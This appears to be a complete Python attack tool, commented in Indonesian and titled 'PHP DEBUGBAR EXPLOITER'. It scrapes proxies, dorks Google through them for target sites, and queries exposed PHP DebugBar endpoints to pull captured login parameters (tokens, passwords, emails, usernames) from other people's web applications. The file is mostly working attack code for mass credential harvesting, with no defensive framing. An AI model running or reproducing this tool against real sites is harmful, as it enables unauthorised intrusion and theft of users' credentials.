import requests as r, re, os, base64, sys, json
from random import choice
from urllib.parse import quote
from bs4 import BeautifulSoup as par
from concurrent.futures import ThreadPoolExecutor as pol
from os.path import exists as adagak
from requests.packages.urllib3.exceptions import InsecureRequestWarning
r.packages.urllib3.disable_warnings(InsecureRequestWarning)

#-> Alat bantu kerja
readFile = lambda name: open(name, "r").read().strip().split("\n") # membaca setiap file
clear = lambda: os.system("cls") if "cmd" in sys.platform.lower() else os.system("clear")

def ceks():
	fileip = input("(?) File target: ")
	while True:
		try:
			check = open(fileip, "r").read().strip().split("\n")
		except FileNotFoundError:
			print("(!) File not found")
			fileip = input("(?) File target: ")
			continue
		break
	return check

def saved():
	files = input("(?) Save result: ")
	while adagak(files):
		print("(!) File tersebut sudah ada")
		yt = input("? Ingin menimpa hasil? [Y/T]: ")
		if yt in list("Yy"):
			return files
		elif yt in list("Tt"):
			files = input("= Save result: ")
			continue
		else:
			files = input("= Save result: ")
			continue
	return files

def get_version_proxy():
	rest = []
	ser = r.Session()
	ser.headers.update({"user-agent": "Mozilla/5.0 (Linux; Android 11; vivo 1904 Build/RP1A.200720.012;) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36"})

	gots = par(ser.get("https://hidemy.name/en/proxy-list/?type=5").text, "html.parser")
	reg = re.findall(">(\d+.\d+.\d+.\d+).*?>(\d+).*?i", str(gots))
	for x in reg:
		rest.append("socks5://"+x[0]+":"+x[1])

	if rest != 0:
		try:os.remove(".proxies")
		except:pass
		for yay in rest:
			open(".proxies", "a+").write(yay+"\n")
		return True
	else:
		return False

def koDork(dork, rse):
	#-> Alternate
	ses = r.Session()
	ses.headers.update({"user-agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0"})
	buka = choice(readFile(".proxies"))
	hasil = 0
	#--------------#

	gets = par(ses.get("https://www.google.com/search?q=" + dork, proxies={"http": buka}).text, "html.parser")
	while True:
		if "overflow:hidden;margin-top:0;padding-top:.33em;text-overflow:ellipsis" in str(gets):
			print("\r(?) Hasil pencarian tidak ada?! ")
			break
		elif "captcha" in str(gets):
			print("\r(!) Upss.. tercegah oleh captcha, silahkan hidup dan matikan mode pesawat ")
			break
		else:
			reg = re.findall("header-feature.*?href=\"(.*?)\".*?data-jsarwt", str(gets))
			hasil += len(reg)

			#-> save
			for sev in reg:
				print("\r(✓) Berhasil mendapatkan "+str(hasil)+" target url ", end="")
				open(rse.replace(".txt","")+".txt", "a+").write(sev+"\n")

			if 'pnnext' in str(gets):
				nice = gets.find("a", {"id": "pnnext"})["href"]
				gets = par(ses.get("https://www.google.com" + nice, proxies={"http": buka}).text, "html.parser")
				continue
			else:
				print("\r(✓) Tersimpan dalam file: "+rse+".txt ", end="\n")
				break

def run_dorking(dork, save):
	try:
		cek = readFile(".proxies")
	except FileNotFoundError:
		exit("(!) Anda harus melakukan update pada proxies ")

	realDork = quote(dork)
	with pol(max_workers=10) as sub:
		sub.submit(koDork, realDork, save)

def phpDebug(target, head={"user-agent":"Mozilla/5.0 (Linux; Android 11; vivo 1904 Build/RP1A.200720.012;) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36"}):
	for x in target:
		show_url = x + "/"
		reg = re.search("(https?://.*?)/", show_url).group(1)
		try:
			get_cek = r.get(reg, headers=head, verify=False)
		except r.exceptions.SSLError:
			reg = reg.replace("https://","http://")
			get_cek = r.get(reg, headers=head, verify=False)
		except r.exceptions.ConnectionError:
			print("(>) Not vuln: "+x)

		if "PhpDebugBar.DebugBar" in str(get_cek.text):
			try:
				cek_ = r.get(reg + "/_debugbar/open?method=POST&offset=0", headers=head, verify=False)
				if len(cek_.json()) == 0 or cek_.status_code != 200:
					print("(>) Not vuln: "+x)
				else:
					cek_ = cek_.json()
					rest, urls = [], []
					for xx in cek_:
						cok = r.get(reg + "/_debugbar/open?op=get&id=" + xx["id"], headers=head, verify=False).json()["request"]
						params = par(cok["request_request"], "html.parser")
						regs = re.findall("HTTP_REFERER.*?\=\>.*?\"(https?://.*?)\"", str(cok))

						if "_token" in str(params) or "password" in str(params) or "usuario" in str(params) or "email" in str(params) or "username" in (params):
							rest.append(params.text)
							urls.append("".join(regs))
						else:
							pass
					if len(rest) != 0:
						hasil = [f"\t(>) Url: "+(x if ul == "" else ul)+"\n\t"+meth.replace("\n","\n\t") for ul, meth in zip(urls,rest)]
						hasil = "\n".join(hasil)
						print(f"\n(>) status: vuln\n(>) result:\n {hasil}\n")
					else:
						print("(>) Status: vuln ("+reg+")(tidak ada form login)")
			except r.exceptions.ConnectionError:
				print("(>) Not vuln: "+reg)
			except json.decoder.JSONDecodeError:
				print("(>) Not vuln: "+reg)
		else:
			print("(>) Not vuln: "+reg)

class Single:
	def sDork():
		dork = input("\n(?) Dork: ")
		while dork == "":
			dork = input("(?) Dork: ")
		sve = saved()
		run_dorking(dork, sve)
	def exploit():
		target = input("\n(?) Target url: ")
		while target == "":
			target = input("(?) Target url: ")
		print("(!) Tunggu!! proses bisa sampai 1-10 detik \n")
		with pol(max_workers=20) as sub:
			sub.submit(phpDebug, target.split("\n"))
		exit("\n(✓) Proses Selesai.. ")

class Multi:
	def sDork():
		target = ceks()
		save = saved()
		for x in target:
			run_dorking(x, save)
	def exploit():
		target = ceks()
		# save = saved()
		print("(!) Tunggu!! proses bisa sampai 1-10 detik \n")

		with pol(max_workers=20) as sub:
			sub.submit(phpDebug, target)
		# phpDebug(target)


def main():
	clear()
	print("""
 _____ _____ _____    ____      _           _
|  _  |  |  |  _  |  |    \ ___| |_ _ _ ___| |_ ___ ___
|   __|     |   __|  |  |  | -_| . | | | . | . | .'|  _|
|__|  |__|__|__|     |____/|___|___|___|_  |___|__,|_|
                                       |___|
	>> PHP DEBUGBAR EXPLOITER v0.1

   (01) Dorking single target
   (02) Dorking multi target with file
   (03) Single exploit php debugbar
   (04) Multi exploit php debugbar with file
   (05) Update proxy
   (00) Exit program
	""")
	pil = input("(>) Pilih menu: ")
	while not pil.isdigit():
		pil = input("(>) Pilih menu: ")
	if pil in ["01","1"]:
		Single.sDork()
	elif pil in ["02","2"]:
		Multi.sDork()
	elif pil in ["03","3"]:
		Single.exploit()
	elif pil in ["04","4"]:
		Multi.exploit()
	elif pil in ["5","05"]:
		if get_version_proxy():
			print("(✓) Selesai.. jalankan ulang")
		else:
			print("(✓) Silahkan hubungi pembuat")
	else:
		exit("(?) Pilih yang bener\n")

if __name__=="__main__":
	main()
